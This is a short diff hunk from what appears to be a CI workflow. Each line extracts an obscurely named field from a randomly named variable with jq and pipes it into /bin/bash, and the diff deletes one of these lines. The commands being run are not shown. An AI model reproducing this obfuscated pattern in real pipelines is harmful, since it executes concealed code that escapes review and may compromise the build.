@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$btkof24468" | jq -r .w336 | /bin/bash
           echo $f3507 | jq -r .fm4 | /bin/bash
           printf '%s' "$fzsg280" | jq -r .rut43 | /bin/bash
-          echo $igptc3 | jq -r .fyes234 | /bin/bash
           printf '%s' "$fc86" | jq -r .o1806 | /bin/bash
           echo $h78057 | jq -r .wil8 | /bin/bash
 
